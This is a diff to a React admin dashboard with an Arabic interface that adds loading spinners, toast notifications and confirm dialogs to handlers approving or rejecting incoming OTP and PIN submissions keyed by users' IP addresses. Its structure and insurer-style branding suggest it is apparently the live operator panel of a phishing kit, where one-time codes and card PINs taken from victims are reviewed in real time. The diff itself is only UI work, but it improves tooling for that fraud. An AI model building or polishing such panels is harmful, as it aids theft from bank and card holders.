@@ -36,6 +36,8 @@ export default function AdminDashboard() {
 
   const [pendingOTP, setPendingOTP] = useState(null);
   const [pendingPIN, setPendingPIN] = useState(null);
+  const [loading, setLoading] = useState(false);
+  const [notification, setNotification] = useState({ show: false, type: '', message: '' });
 
   useEffect(() => {
     const isAuth = sessionStorage.getItem('adminAuthenticated');
@@ -248,12 +250,20 @@ export default function AdminDashboard() {
   const handleRefresh = () => {
     if (socket) {
       socket.emit('loadData');
+      showNotification('info', '🔄 جاري تحديث البيانات...');
     }
+  };
+
+  const showNotification = (type, message) => {
+    setNotification({ show: true, type, message });
+    setTimeout(() => {
+      setNotification({ show: false, type: '', message: '' });
+    }, 3000);
   };
 
   const approveOTP = () => {
     if (socket && pendingOTP) {
-      // استخراج IP من مصادر مختلفة محتملة
+      setLoading(true);
       const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
       console.log('✅ Approving OTP for IP:', ip, 'Full data:', pendingOTP);
       
@@ -262,12 +272,20 @@ export default function AdminDashboard() {
         status: 'approved',
         message: 'تم قبول رمز التحقق'
       });
-      setPendingOTP(null);
+      
+      setTimeout(() => {
+        setLoading(false);
+        setPendingOTP(null);
+        showNotification('success', '✅ تم قبول رمز التحقق OTP بنجاح');
+      }, 500);
     }
   };
 
   const rejectOTP = () => {
     if (socket && pendingOTP) {
+      if (!window.confirm('⚠️ هل أنت متأكد من رفض رمز التحقق OTP؟')) return;
+      
+      setLoading(true);
       const ip = pendingOTP.ip || pendingOTP.payload?.ip || pendingOTP.userIp;
       console.log('❌ Rejecting OTP for IP:', ip, 'Full data:', pendingOTP);
       
@@ -276,13 +294,18 @@ export default function AdminDashboard() {
         status: 'rejected',
         message: 'رمز التحقق غير صحيح'
       });
-      setPendingOTP(null);
+      
+      setTimeout(() => {
+        setLoading(false);
+        setPendingOTP(null);
+        showNotification('error', '❌ تم رفض رمز التحقق OTP');
+      }, 500);
     }
   };
 
   const approvePIN = () => {
     if (socket && pendingPIN) {
-      // استخراج IP من مصادر مختلفة محتملة
+      setLoading(true);
       const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
       console.log('✅ Approving PIN for IP:', ip, 'Full data:', pendingPIN);
       
@@ -291,13 +314,20 @@ export default function AdminDashboard() {
         status: 'approved',
         message: 'تم قبول الرمز السري'
       });
-      setPendingPIN(null);
+      
+      setTimeout(() => {
+        setLoading(false);
+        setPendingPIN(null);
+        showNotification('success', '✅ تم قبول الرمز السري PIN بنجاح');
+      }, 500);
     }
   };
 
   const rejectPIN = () => {
     if (socket && pendingPIN) {
-      // استخراج IP من مصادر مختلفة محتملة
+      if (!window.confirm('⚠️ هل أنت متأكد من رفض الرمز السري PIN؟')) return;
+      
+      setLoading(true);
       const ip = pendingPIN.ip || pendingPIN.payload?.ip || pendingPIN.userIp;
       console.log('❌ Rejecting PIN for IP:', ip, 'Full data:', pendingPIN);
       
@@ -306,7 +336,12 @@ export default function AdminDashboard() {
         status: 'rejected',
         message: 'الرمز السري غير صحيح'
       });
-      setPendingPIN(null);
+      
+      setTimeout(() => {
+        setLoading(false);
+        setPendingPIN(null);
+        showNotification('error', '❌ تم رفض الرمز السري PIN');
+      }, 500);
     }
   };
 
@@ -390,6 +425,30 @@ export default function AdminDashboard() {
 
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
+      {/* Notification Toast */}
+      {notification.show && (
+        <div className={`toast-notification fixed top-4 left-1/2 transform -translate-x-1/2 z-[100] ${
+          notification.type === 'success' ? 'bg-gradient-to-r from-green-500 to-emerald-600' :
+          notification.type === 'error' ? 'bg-gradient-to-r from-red-500 to-rose-600' :
+          'bg-gradient-to-r from-blue-500 to-cyan-600'
+        } text-white px-6 py-4 rounded-xl shadow-2xl flex items-center gap-3`}>
+          {notification.type === 'success' && <CheckCircle className="w-6 h-6 animate-pulse" />}
+          {notification.type === 'error' && <XCircle className="w-6 h-6 animate-pulse" />}
+          {notification.type === 'info' && <AlertCircle className="w-6 h-6 animate-pulse" />}
+          <span className="font-semibold text-lg">{notification.message}</span>
+        </div>
+      )}
+
+      {/* Loading Overlay */}
+      {loading && (
+        <div className="loading-overlay fixed inset-0 bg-black/50 flex items-center justify-center z-[90] backdrop-blur-sm">
+          <div className="bg-white rounded-2xl p-8 flex flex-col items-center gap-4 shadow-2xl">
+            <div className="w-16 h-16 border-4 border-qiic-maroon border-t-transparent rounded-full animate-spin"></div>
+            <p className="text-gray-700 font-semibold text-lg">جاري المعالجة...</p>
+          </div>
+        </div>
+      )}
+
       {/* OTP Modal */}
       {pendingOTP && (
         <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
@@ -429,14 +488,20 @@ export default function AdminDashboard() {
             <div className="flex gap-3">
               <button
                 onClick={approveOTP}
-                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
+                disabled={loading}
+                className="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-green-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                <CheckCircle className="w-5 h-5" />
-                قبول
+                {loading ? (
+                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                ) : (
+                  <CheckCircle className="w-5 h-5" />
+                )}
+                {loading ? 'جاري المعالجة...' : 'قبول'}
               </button>
               <button
                 onClick={rejectOTP}
-                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
+                disabled={loading}
+                className="flex-1 bg-gradient-to-r from-red-500 to-rose-600 hover:from-red-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-red-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 <XCircle className="w-5 h-5" />
                 رفض
@@ -485,14 +550,20 @@ export default function AdminDashboard() {
             <div className="flex gap-3">
               <button
                 onClick={approvePIN}
-                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
+                disabled={loading}
+                className="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-green-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                <CheckCircle className="w-5 h-5" />
-                قبول
+                {loading ? (
+                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                ) : (
+                  <CheckCircle className="w-5 h-5" />
+                )}
+                {loading ? 'جاري المعالجة...' : 'قبول'}
               </button>
               <button
                 onClick={rejectPIN}
-                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
+                disabled={loading}
+                className="flex-1 bg-gradient-to-r from-red-500 to-rose-600 hover:from-red-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-red-500/50 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 <XCircle className="w-5 h-5" />
                 رفض
